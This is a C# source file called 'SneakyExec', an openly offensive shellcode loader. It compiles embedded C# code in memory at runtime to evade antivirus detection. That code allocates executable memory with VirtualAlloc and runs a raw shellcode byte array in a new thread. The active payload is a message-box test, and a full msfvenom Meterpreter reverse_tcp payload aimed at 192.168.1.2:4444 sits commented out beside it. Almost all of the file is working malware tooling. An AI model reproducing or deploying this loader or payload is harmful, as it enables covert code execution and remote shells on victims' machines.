﻿using System;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;


namespace SneakyExec
{
    class Program
    {
        //using https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/ 
        // and using https://raw.githubusercontent.com/vysec/FSharp-Shellcode/master/FSharp-Shellcode.fs as base
        // and using https://stackoverflow.com/questions/1361965/compile-simple-string 
        // shellcode test from https://www.exploit-db.com/exploits/28996/ for msgbox popup
        static void Main(string[] args)
        {
                string code= @"
                            using System;
                            using System.Reflection;
                            using System.Runtime.InteropServices;

                            namespace Namespace
                            {
                                class Program
                                {
                                    private static UInt32 MEM_COMMIT = 0x1000;
                                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
                                            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

                                    [DllImport(""kernel32"")]
                                    private static extern IntPtr CreateThread(
                                        UInt32 lpThreadAttributes,
                                        UInt32 dwStackSize,
                                        UInt32 lpStartAddress,
                                        IntPtr param,
                                        UInt32 dwCreationFlags,
                                        ref UInt32 lpThreadId
                                        );

                                    [DllImport(""kernel32"")]
                                    private static extern UInt32 WaitForSingleObject(
                                        IntPtr hHandle,
                                        UInt32 dwMilliseconds
                                        );

                                    public void run()
                                    {
                                        //msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f chsarp
                                        //byte[] shellcode = new byte[] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x3b,0x84,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
                                        //Broken Byte msgbox test                                       
                                        byte[] shellcode = new byte[] {0x31,0xd2,0xb2,0x30,0x64,0x8b,0x12,0x8b,0x52,0x0c,0x8b,0x52,0x1c,0x8b,0x42,0x08,0x8b,0x72,0x20,0x8b,0x12,0x80,0x7e,0x0c,0x33,0x75,0xf2,0x89,0xc7,0x03,0x78,0x3c,0x8b,0x57,0x78,0x01,0xc2,0x8b,0x7a,0x20,0x01,0xc7,0x31,0xed,0x8b,0x34,0xaf,0x01,0xc6,0x45,0x81,0x3e,0x46,0x61,0x74,0x61,0x75,0xf2,0x81,0x7e,0x08,0x45,0x78,0x69,0x74,0x75,0xe9,0x8b,0x7a,0x24,0x01,0xc7,0x66,0x8b,0x2c,0x6f,0x8b,0x7a,0x1c,0x01,0xc7,0x8b,0x7c,0xaf,0xfc,0x01,0xc7,0x68,0x79,0x74,0x65,0x01,0x68,0x6b,0x65,0x6e,0x42,0x68,0x20,0x42,0x72,0x6f,0x89,0xe1,0xfe,0x49,0x0b,0x31,0xc0,0x51,0x50,0xff,0xd7};
                                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                                        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                                        IntPtr hThread = IntPtr.Zero;
                                        UInt32 threadId = 0;
                                        IntPtr pinfo = IntPtr.Zero;
                                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                                    }
                                }
                            }";
            function1(code, "Namespace", "Program", "run", false, null);
         }

        

        public static object function1(string code, string namespacename, string classname, string functionname, bool isstatic, params object[] args)
        {
            object returnval = null;
            Assembly asm = BuildAssembly(code);
            object instance = null;
            Type type = null;
            if (isstatic)
            {
                type = asm.GetType(namespacename + "." + classname);
            }
            else
            {
                instance = asm.CreateInstance(namespacename + "." + classname);
                type = instance.GetType();
            }
            MethodInfo method = type.GetMethod(functionname);
            returnval = method.Invoke(instance, args);
            return returnval;
        }

        private static Assembly BuildAssembly(string code)
        {
            Microsoft.CSharp.CSharpCodeProvider provider = new CSharpCodeProvider();
            ICodeCompiler compiler = provider.CreateCompiler();
            CompilerParameters compilerparams = new CompilerParameters();
            compilerparams.GenerateExecutable = false;
            compilerparams.GenerateInMemory = true;
            CompilerResults results = compiler.CompileAssemblyFromSource(compilerparams, code);
            return results.CompiledAssembly;
        }

    }
}
